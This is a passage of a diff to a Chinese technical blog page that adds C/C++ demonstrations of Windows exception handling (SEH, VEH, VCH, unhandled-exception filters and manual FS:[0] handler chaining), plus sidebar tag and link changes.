(EXCEPTION_ACCESS_VIOLATION == Code) &#123;</span><br><span class="line">		*p = &amp;a;  //此处发现异常一直不断发生</span><br><span class="line">		return EXCEPTION_CONTINUE_EXECUTION; //修复了异常，从产生异常处执行。</span><br><span class="line">	&#125;</span><br><span class="line">	else if (EXCEPTION_STACK_OVERFLOW == Code) &#123;</span><br><span class="line">		return EXCEPTION_CONTINUE_SEARCH;  //修复不了，让别人修复吧</span><br><span class="line">	&#125;</span><br><span class="line">	else if (EXCEPTION_BREAKPOINT == Code) &#123;</span><br><span class="line">		return EXCEPTION_EXECUTE_HANDLER;   //请执行异常处理块吧</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int _tmain(int argc, _TCHAR* argv[]) &#123;</span><br><span class="line">	int *p = NULL;</span><br><span class="line">	__try &#123;</span><br><span class="line">		p = NULL;</span><br><span class="line">		*p = 100;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (Filter(GetExceptionCode(), GetExceptionInformation(), &amp;p)) &#123;</span><br><span class="line">		printf(&quot;hehe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>VEH:AddVectoredExceptionHandler函数实现</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//veh异常处理函数</span><br><span class="line">LONG NTAPI veh_handlerA(</span><br><span class="line">  _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 访问异常</span><br><span class="line"> //if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> //&#123;</span><br><span class="line"> // ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line"> // //异常处理了，回去执行</span><br><span class="line"> // return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> //&#125;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">//veh异常处理函数</span><br><span class="line">LONG NTAPI veh_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //veh,一经注册全进程有效</span><br><span class="line"> AddVectoredExceptionHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  veh_handlerA);    //异常处理回调</span><br><span class="line"> AddVectoredExceptionHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  veh_handlerB);    //异常处理回调</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line"> __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">// 总结，程序中如果有veh,同时拥有seh,系统会先检查veh,veh处理不了在找seh处理。</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>VCH: AddVectoredContinueHandler函数实现</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//vch异常处理函数</span><br><span class="line">LONG NTAPI vch_handlerA(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 访问异常</span><br><span class="line"> //if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> //&#123;</span><br><span class="line"> // ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line"> // //异常处理了，回去执行</span><br><span class="line"> // return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> //&#125;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">//vch异常处理函数</span><br><span class="line">LONG NTAPI vch_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //vch,一经注册全进程有效</span><br><span class="line"> AddVectoredContinueHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  vch_handlerA);    //异常处理回调</span><br><span class="line"> AddVectoredContinueHandler(</span><br><span class="line">  TRUE, //调用顺序</span><br><span class="line">  vch_handlerB);    //异常处理回调</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line"> __except (EXCEPTION_CONTINUE_SEARCH)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">// 总结：程序中如果有vch,同时拥有seh，那么先处理seh,如果seh无法处理，再交给vch</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>默认SEH异常处理函数:SetUnhandledExceptionFilter函数实现</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int a = 0;</span><br><span class="line">//seh异常处理函数</span><br><span class="line">LONG NTAPI seh_handlerB(</span><br><span class="line"> _EXCEPTION_POINTERS *ExceptionInfo //异常处理信息</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"> // 处理不了，你继续搜索其他处理</span><br><span class="line"> printf(&quot;调用默认的SEH函数了\n&quot;);</span><br><span class="line"> if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line"> &#123;</span><br><span class="line">  ExceptionInfo-&gt;ContextRecord-&gt;Eax = (DWORD)&amp;a;</span><br><span class="line">  //异常处理了，回去执行</span><br><span class="line">  return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line"> &#125;</span><br><span class="line"> return EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> //默认seh处理函数,一经注册全进程有效</span><br><span class="line"> SetUnhandledExceptionFilter(seh_handlerB);</span><br><span class="line"> //触发一个访问异常</span><br><span class="line"> __try &#123;</span><br><span class="line">  _asm mov eax, 0;</span><br><span class="line">  _asm mov[eax], 0x55;</span><br><span class="line"> &#125;</span><br><span class="line">// 总结：当所有的seh都无法处理时，调用默认顶级异常UEH.</span><br><span class="line"> __except (EXCEPTION_CONTINUE_SEARCH)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;SEH异常处理函数\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>SEH原理剖析</p>
+</blockquote>
+<p>用户层有数据结构叫做TEB,产生异常时,系统通过FS:[0]找到链表，依次调用异常处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//异常处理指针</span><br><span class="line">typedef LONG (NTAPI *ExceptionFun)(</span><br><span class="line">	_Inout_ struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">	_In_ PVOID EstablisherFrame,</span><br><span class="line">	_Inout_ struct _CONTEXT *ContextRecord,</span><br><span class="line">	_In_ PVOID DispatcherContext</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int a = 5;</span><br><span class="line">// 异常处理回调</span><br><span class="line">LONG NTAPI</span><br><span class="line">Exception_routine(</span><br><span class="line">	_Inout_ struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">	_In_ PVOID EstablisherFrame,</span><br><span class="line">	_Inout_ struct _CONTEXT *ContextRecord,</span><br><span class="line">	_In_ PVOID DispatcherContext</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	//修复异常</span><br><span class="line">	ContextRecord-&gt;Eax = (DWORD)&amp;a;	</span><br><span class="line">	//异常修复了回去执行。</span><br><span class="line">	return EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// 异常结构体</span><br><span class="line">	struct Excptionlist &#123;</span><br><span class="line">		Excptionlist * pnext;</span><br><span class="line">		ExceptionFun hander;</span><br><span class="line">	&#125;;</span><br><span class="line">	Excptionlist node;</span><br><span class="line">	node.hander = Exception_routine;		//异常处理回调</span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs:[0];					//excptionlist 异常指针</span><br><span class="line">		mov dword ptr[node.pnext], eax;		//指向原始的地址</span><br><span class="line">		lea eax, node;						//获取节点的地址</span><br><span class="line">		mov fs:[0], eax;					//插入新节点</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//触发异常</span><br><span class="line">	_asm  mov eax, 0;</span><br><span class="line">	_asm  mov[eax], 0x55;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	//卸载异常处理器</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, fs:[0].pnext;	//excptionlist 指针</span><br><span class="line">		mov fs:[0], eax;  //fs:[0] = node.next;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
       
 
       
@@ -964,11 +962,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Window内核漏洞利用</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
         		</li>
       		
 		</ul>
@@ -978,7 +972,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/内核shellcode/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/windows异常与调试/">展开全文 >></a>
         </p>
       
 
@@ -1105,15 +1099,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">C++</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1121,7 +1107,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
+                <a href="javascript:void(0)" class="js-tag color4">C++</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1129,11 +1115,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+                <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1142,6 +1132,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">HOOK技术</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1193,15 +1191,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1221,11 +1215,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
+                <a href="javascript:void(0)" class="js-tag color3">脱壳</a>
               </li>
              
               <li class="article-tag-list-item">
